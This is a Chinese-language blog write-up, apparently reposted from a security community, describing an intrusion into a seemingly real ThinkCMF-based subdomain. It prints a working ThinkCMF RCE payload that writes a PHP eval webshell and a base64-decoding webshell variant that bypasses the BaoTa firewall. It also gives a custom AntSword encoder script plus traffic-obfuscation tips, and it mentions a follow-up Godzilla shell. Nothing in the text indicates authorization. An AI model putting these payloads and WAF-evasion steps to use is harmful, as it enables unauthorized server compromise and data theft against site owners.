> 本文由 [简悦 SimpRead](http://ksria.com/simpread/) 转码， 原文地址 [mp.weixin.qq.com](https://mp.weixin.qq.com/s/vTPXkuDMVNx06C_cOYqSag)

**0x00 信息收集**

由于主站存在云 waf 一测就封 且初步测试不存在能用得上的洞 所以转战分站 希望能通过分站获得有价值的信息

这是一个查询代理帐号的站 url 输入 admin 自动跳转至后台  

![](https://mmbiz.qpic.cn/mmbiz_png/GzdTGmQpRic1sSHO7ibHZySlFQEJtp55YhsBnrn0xlpiaAIuultiawfqiaogS0icVkPq4O5nUIlURl6kyqNrQu2GCbxw/640?wx_fmt=png)  
看这个参数 猜测可能是 thinkCMF

**0x01 getshell**

thinkcmf 正好有一个 RCE 可以尝试一下

```
?a=fetch&templateFile=public/index&prefix=''&content=<php>file_put_contents('test1.php','<?php @eval($_POST[zero])?>')</php>
```

![](https://mmbiz.qpic.cn/mmbiz_png/GzdTGmQpRic1sSHO7ibHZySlFQEJtp55YhAEHKvze9TLYIBWHicrw1HOzsaog5oAF5OB7VaR6rV7a5aMvXlBekY7Q/640?wx_fmt=png)

白屏是个好兆头 应该是成功了  
访问一下

![](https://mmbiz.qpic.cn/mmbiz_png/GzdTGmQpRic1sSHO7ibHZySlFQEJtp55YhlaqqtWfWf14iaOKtscEhsTg23x852sDthGsf21drgLXz7yBZTXH1eIA/640?wx_fmt=png)

尝试蚁剑连接 直接报错 猜测可能遇到防火墙了

![](https://mmbiz.qpic.cn/mmbiz_png/GzdTGmQpRic1sSHO7ibHZySlFQEJtp55YhlVQHiaj8qVDw5ick9E7VKoWC0UcADCpPeA3ObFcYHLia2xg1X2gfoibLKQ/640?wx_fmt=png)

然后再回来看一下 shell 手动尝试一个 phpinfo

![](https://mmbiz.qpic.cn/mmbiz_png/GzdTGmQpRic1sSHO7ibHZySlFQEJtp55Yh0vtGqRR6gX4l0t53z3lyRkIvoMQiajAgUUEO8QU8yo26a1TFVp0yD8Q/640?wx_fmt=png)

  
果然存在宝塔防火墙  

**0x02 绕过宝塔防火墙**

宝塔应该对部分函数进行了过滤，所以直接传递 payload 肯定是不行的，所以我们需要对流量进行混淆加密。

尝试将所有的 payload Base64 编码传输

既然传过去的是编码后的 Base64，小马也应该相应做出改变，只需解密一次传递过来的 base64 即可。

小马如下：

<?php @eval(base64_decode($_POST[zero]));?>

将 phpinfo();base64 编码为 cGhwaW5mbygpOw==

发送

![](https://mmbiz.qpic.cn/mmbiz_png/GzdTGmQpRic1sSHO7ibHZySlFQEJtp55YhwjQ97Sor3czUAswAAKgmwvdw1WiahA4gRJP3ReTicCDSc12DiaZW0b3vg/640?wx_fmt=png)

可见 宝塔防火墙没再拦截 已经成功绕过宝塔防火墙

**0x03 改造蚁剑**

我们用到的是 Base64 编码，但是蚁剑其实是自带 Base64 编码解码器的 。

尝试直接使用自带的 Base64 编码器

![](https://mmbiz.qpic.cn/mmbiz_png/GzdTGmQpRic1sSHO7ibHZySlFQEJtp55YhOEW4sttqmDjQlXsgOzJKYQIteiacMUutnnr8fXUiblA3ibQSzibm4gWLicw/640?wx_fmt=png)

为什么会这样呢？

我们尝试从蚁剑的流量分析

设置代理到 burp

![](https://mmbiz.qpic.cn/mmbiz_png/GzdTGmQpRic1sSHO7ibHZySlFQEJtp55Yh2tN4ZzHibicKcHdvib4lm7UgA43Xy4rfIROB7gyPX82thRWuOAWnXcc7w/640?wx_fmt=png)

拦截流量

![](https://mmbiz.qpic.cn/mmbiz_png/GzdTGmQpRic1sSHO7ibHZySlFQEJtp55YhoRf7uTgQian5BC9xRIpMHXsRUdOt9z3KMyfuhPTOeIyJoU5d38DZ3eQ/640?wx_fmt=png)

我们可以看到 明显有两个地方容易被 waf 识别

一是：User-Agent 头的关键字：antSword/v2.1 这相当于直接告诉 waf 我是谁了， 所以这是第一个要更改的点

二是：蚁剑的流量其实还是有关键字的 比如 cmd 参数后的 eval base64_decode 都是，而且我们的小马自带 Base64 解密，所以用它的默认编码器不仅过不去 waf 即使没 waf 也不能正常连接我们的小马，所以需要自己定义编码器。

新建 PHP 编码器

![](https://mmbiz.qpic.cn/mmbiz_png/GzdTGmQpRic1sSHO7ibHZySlFQEJtp55YhU2VO5ONzrib8KWEw1cJpYzv0gXC5GFPYSg8If3EUjQS1PwvM0M36mKw/640?wx_fmt=png)

由于我们只需要将 payloadBase64 编码一次即可，所以直接将`data['_']Base64` 处理赋值即可 随机参数有没有无所谓的

编码器如下

```
'use strict';/** @param  {String} pwd   连接密码* @param  {Array}  data  编码器处理前的 payload 数组* @return {Array}  data  编码器处理后的 payload 数组*/module.exports = (pwd, data, ext={}) => {

  data[pwd] = Buffer.from(data['_']).toString('base64');

  delete data['_'];

  return data;}

```

然后修改 UA 头

![](https://mmbiz.qpic.cn/mmbiz_png/GzdTGmQpRic1sSHO7ibHZySlFQEJtp55YhosFKxMXUPXpktkO9reAL3AEAS14b5NibHe4XtchULNRNwEEPtx6Akcg/640?wx_fmt=png)

应用我们的编码器 解码器不需要指定 默认即可  
建议选择 增加垃圾数据和 Multipart 发包

![](https://mmbiz.qpic.cn/mmbiz_png/GzdTGmQpRic1sSHO7ibHZySlFQEJtp55Yhzp1JJJ8p6iaEMmPWiaEUXzicg7KBNMGO6t7NzA1vAtRZwUFEDTmgH1kaQ/640?wx_fmt=png)

再次测试连接

![](https://mmbiz.qpic.cn/mmbiz_png/GzdTGmQpRic1sSHO7ibHZySlFQEJtp55YhwcCfe7Sv15KvmEAWECnmxnNlzvCUcYdLoibhJopq8ahl4e8muDHoKEg/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_png/GzdTGmQpRic1sSHO7ibHZySlFQEJtp55YhkiasSPicRefib4ia0dDTarRY8xyd8jEPPjzicmiaJvnZ1DtYCgWVxiazFDflw/640?wx_fmt=png)

然后点击目录 发现依然存在问题 不能跨目录 这个问题其实哥斯拉可以解决 上传哥斯拉马

这里可能有人会问了 那你直接上传哥斯拉马不就行了吗 实际情况是 get 传参有长度限制 而且有的符号会导致截断 php 文件无法上传完整

![](https://mmbiz.qpic.cn/mmbiz_png/GzdTGmQpRic1sSHO7ibHZySlFQEJtp55Yh5v74hia6FjM8vd5DlOp2vYopDzqhbxNg9f0iaU4uZbnq2b5iaVpxSsvOQ/640?wx_fmt=png)  
网站有挺多 但是很可惜没有主站 数据库里只有一堆代理帐号 浪费时间了

![](https://mmbiz.qpic.cn/mmbiz_png/GzdTGmQpRic1sSHO7ibHZySlFQEJtp55YhyluISfA2L5hx0NXDmCo63MNBTfbOoaz3Wnd6qs50YCwkL9tcgPc5rQ/640?wx_fmt=png)作者：pureqh，转载于先知社区。

![](https://mmbiz.qpic.cn/mmbiz_gif/7QRTvkK2qC7IHABFmuMlWQkSSzOMicicfBLfsdIjkOnDvssu6Znx4TTPsH8yZZNZ17hSbD95ww43fs5OFEppRTWg/640?wx_fmt=gif)

●[干货 | 渗透学习资料大集合（书籍、工具、技术文档、视频教程）](http://mp.weixin.qq.com/s?__biz=MzIwMzIyMjYzNA==&mid=2247490892&idx=2&sn=5820f8871f23ffc525a27e1c6ae1ae4c&chksm=96d3e649a1a46f5f88051b88fb05efd4cda4c885a4f47ac63795354cbfe5e3a93de747f3f10a&scene=21#wechat_redirect)

![](https://mmbiz.qpic.cn/mmbiz_jpg/GzdTGmQpRic1sSHO7ibHZySlFQEJtp55YhhSkbmEwrfDUq1W6Fpg5zBtN3oPC3DwGUCFdGJ8pj9KdcX4hicBzNsfw/640?wx_fmt=jpeg)

公众号

**点击上方，关注公众号**

如文章对你有帮助，请支持点下 “赞”“在看”